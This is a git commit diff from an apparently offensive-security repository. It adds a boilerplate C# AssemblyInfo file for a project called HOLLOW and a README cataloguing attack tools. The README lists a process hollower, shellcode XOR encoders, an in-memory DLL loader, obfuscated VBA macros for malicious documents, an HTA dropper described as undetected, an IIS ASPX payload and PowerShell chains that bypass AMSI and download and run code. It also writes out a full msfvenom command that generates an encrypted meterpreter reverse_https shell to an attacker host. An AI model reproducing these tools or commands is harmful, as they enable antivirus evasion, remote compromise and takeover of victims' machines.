2f1859bf3f3891aca264f8fb93fa298e56f827b0
Karmaz95 <karol.mazurek95@gmail.com>
2022-03-21 15:14:44 +0100

    Patch

---
+++ HOLLOW/Properties/AssemblyInfo.cs
@@ -0,0 +1,36 @@
+﻿using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+
+// Ogólne informacje o zestawie są kontrolowane poprzez następujący 
+// zestaw atrybutów. Zmień wartości tych atrybutów, aby zmodyfikować informacje
+// powiązane z zestawem.
+[assembly: AssemblyTitle("HOLLOW")]
+[assembly: AssemblyDescription("")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("")]
+[assembly: AssemblyProduct("HOLLOW")]
+[assembly: AssemblyCopyright("Copyright ©  2022")]
+[assembly: AssemblyTrademark("")]
+[assembly: AssemblyCulture("")]
+
+// Ustawienie elementu ComVisible na wartość false sprawia, że typy w tym zestawie są niewidoczne
+// dla składników COM. Jeśli potrzebny jest dostęp do typu w tym zestawie z
+// COM, ustaw wartość true dla atrybutu ComVisible tego typu.
+[assembly: ComVisible(false)]
+
+// Następujący identyfikator GUID jest identyfikatorem biblioteki typów w przypadku udostępnienia tego projektu w modelu COM
+[assembly: Guid("4cd13819-6e6c-4a89-9a87-fff3efa7ac62")]
+
+// Informacje o wersji zestawu zawierają następujące cztery wartości:
+//
+//      Wersja główna
+//      Wersja pomocnicza
+//      Numer kompilacji
+//      Poprawka
+//
+// Możesz określić wszystkie wartości lub użyć domyślnych numerów kompilacji i poprawki
+// przy użyciu symbolu „*”, tak jak pokazano poniżej:
+// [assembly: AssemblyVersion("1.0.*")]
+[assembly: AssemblyVersion("1.0.0.0")]
+[assembly: AssemblyFileVersion("1.0.0.0")]
--- README.md
+++ README.md
@@ -1,5 +1,52 @@
-
-
+## TOOLS:
+* Platform.sln => platform.exe
+```
+PE with bypasses - use with x86/shikata_ga_nai | x64/zutto_dekiru encoder + XOREncrypt.sln
+```
+* XOREncrypt.sln => XOREncrypt.exe 
+```
+A second layer shellcode XOR encoer.
+```
+* holcrimson.sln => holcrimson.dll
+```
+Unamanged DLL for in memory loading - use with x86/shikata_ga_nai | x64/zutto_dekiru encoder + XOREncrypt.sln
+```
+* Doc1.doc - example Doc1.doc from medium article.
+* VBA_XORencrypt.ps1 - Powershell script for encrypting 4 parts of VBA macro.
+* Platform.txt - PS script
+```
+1. AMSI bypass
+2. Download DLL
+3. Load DLL to memory.
+4. Run DLL.
+```
+* macro.vba - for Doc1.doc
+```
+Obfuscated VBA macro for docm / doc attack.
+```
+* platform.aspx - for IIS webserver attack
+```
+Use with msfvenom encrypted generated shellcode + XOREncrypt.sln
+```
+* platform.hta - dropper.
+```
+Use with obfuscated PE ShellCode Runner
+Download to disk and run - this is undetected.
+```
+* isma.txt - use "-arg=1".split for arguemnts parsing.
+```
+1. AMSI bypass
+2. Download PE
+3. Load PE to memory.
+4. Run PE.
+```
+* HOLLOW.sln => HOLLOW.exe - Process Hollower.
+```
+1. Generate encrypted shellcode
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$ip LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key w -o shell.cs
+2. Place inside and compile it.
+```
+* ConfuserEX.zip - for PE obfuscation.
 
 ## SCORE 
 <p align="center">
